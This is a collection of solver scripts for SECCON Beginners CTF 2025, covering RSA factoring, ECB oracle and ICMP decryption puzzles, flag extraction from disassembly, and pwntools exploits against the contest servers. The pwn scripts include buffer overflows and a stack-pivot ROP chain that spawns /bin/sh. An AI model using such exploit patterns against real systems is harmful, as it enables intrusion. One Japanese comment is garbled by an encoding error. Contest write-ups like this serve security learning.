# SECCON Beginners CTF 2025

## crypto

### seesaw

```python
#!/usr/bin/env python3
from Crypto.Util.number import inverse, long_to_bytes
from sympy import primerange

n = 362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
e = 65537
c = 104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079

for q in primerange(2**15, 2**16):
    if n % q == 0:
        p = n // q
        print('q:', q)
        print('p:', p)
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)
        m = pow(c, d, n)
        print("decrypt:", long_to_bytes(m))
        break

# https://factordb.com/index.php?query=362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
q = 33091
p = n // q
print('q:', q)
print('p:', p)
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
print("decrypt:", long_to_bytes(m))
```

## 01-Translator

```
#!/usr/bin/env python3
from pwn import process, remote
from Crypto.Util.number import long_to_bytes

io = remote('01-translator.challenges.beginners.seccon.jp', 9999)
# io = process('./poc.py')
io.sendlineafter(b'> ', b'0'*16)
io.sendlineafter(b'> ', b'1'*16)
io.recvuntil(b'ct: ')
ct = bytes.fromhex(io.recvline().strip().decode())
io.close()
chunks = [ct[i:i+16] for i in range(0, len(ct), 16)][:-1]
unique_chunks = list(set(chunks))
res = ""
for chunk in chunks:
    res += str(unique_chunks.index(chunk))
print(res)
print(long_to_bytes(int(res, 2)))
```

## misc

### chamber-of-echos 

```python
#!/usr/bin/env python3
from scapy.all import rdpcap, ICMP, Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# https://gist.github.com/kotokaze/dc39dbb7dbe4dec389358eefc4abcd10
# sudo tcpdump -w icmp.pcap -i eth0 icmp
# ping chamber-of-echos.challenges.beginners.seccon.jp
cipher_chunks = []
for pkt in rdpcap('icmp.pcap'):
    if len(pkt) >= 98:
        continue
    if ICMP in pkt and Raw in pkt:
        data = bytes(pkt[Raw])
        print(f'Length={len(pkt)}: {data.hex()}')
        cipher_chunks.append(data)
key = bytes.fromhex('546869734973415365637265744b6579')
cipher = AES.new(key, AES.MODE_ECB)
chunks = [unpad(cipher.decrypt(data), 16) for data in set(cipher_chunks)]
print(b''.join(chunk[2:] for chunk in sorted(chunks)))
```

## pwnable

### pet_name

```python
#!/usr/bin/env python3
from pwn import context, process, remote, ELF

exe = context.binary = ELF('./chall')
# io = process(exe.path)
io = remote('pet-name.challenges.beginners.seccon.jp', 9080)
io.sendline(b'A'*32 + b'/home/pwn/flag.txt')
io.interactive()
```

### pet_sound

```python
#!/usr/bin/env python3
from pwn import context, p64, process, remote, ELF

exe = context.binary = ELF('./chall')
# io = process(exe.path)
io = remote('pet-sound.challenges.beginners.seccon.jp', 9090)
# [hint] The secret action 'speak_flag' is at: 0x56225fcc5492
io.recvuntil('at: 0x')
target = int(io.recvline().strip(), 16)
io.sendline(b'A'*40 + p64(target))
io.interactive()
```

### pivot4b

```python
#!/usr/bin/env python3
from pwn import context, gdb, p64, process, remote, u64, ELF
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# context.log_level = 'debug'
exe = context.binary = ELF('chall')
# io = process([exe.path])
# io = gdb.debug([exe.path], 'tbreak main\nc')
io = remote('pivot4b.challenges.beginners.seccon.jp', 12300)
io.recvuntil(b'message: 0x')
addr_message = int(io.recvline().strip(), 16)
print(f'[*] addr of message: {addr_message:x}')
payload = b''
payload += p64(u64(b'/bin/sh\x00'))  # b'/bin/sh\x00'
payload += p64(0x000000000040117a)   # pop rdi; ret;
payload += p64(addr_message)         # addr of b'/bin/sh\x00'
payload += p64(0x000000000040101a)   # ret;
payload += p64(exe.plt['system'])    # call system@plt
payload += b'A'*(0x30-len(payload))
payload += p64(addr_message)         # ret addr
payload += p64(0x0000000000401211)   # leave; ret;
io.sendafter(b'> ', payload)
io.interactive()
```

## reversing

### CrazyLazyProgram1

```python
#!/usr/bin/env python3
# https://zenn.dev/juck28/articles/64c6bdca67376e
import subprocess
result = subprocess.check_output(r'''
grep -o '0x..' CrazyLazyProgram1/CLP1.cs|tr '\n' ' '|sed 's/0x//g'
''', shell=True, text=True)
print(bytes.fromhex(result))
```

### CrazyLazyProgram2

```python
#!/usr/bin/env python3
# https://zenn.dev/juck28/articles/64c6bdca67376e
# pseudocode.c 縺ｯ IDA Free 縺ｧ騾・さ繝ｳ繝代う繝ｫ縺励◆繧ゅ・
import subprocess
result = subprocess.check_output('''
grep -o '== [0-9]*' pseudocode.c|sed 's/== //'|tr '\n' ' '
''', shell=True, text=True)
print(bytes([int(x) for x in result.split()]))
```

### D-compile

```python
#!/usr/bin/env python3
# https://zenn.dev/juck28/articles/64c6bdca67376e
import subprocess
result = subprocess.check_output(r'''
objdump -D -M intel ./d-compile/d-compile|
grep -o 'BYTE PTR \[rbp-0x..],0x..'|sed 's/.*,0x\(..\)/\1/'|tr '\n' ' '
''', shell=True, text=True)
print(bytes.fromhex(result))
```
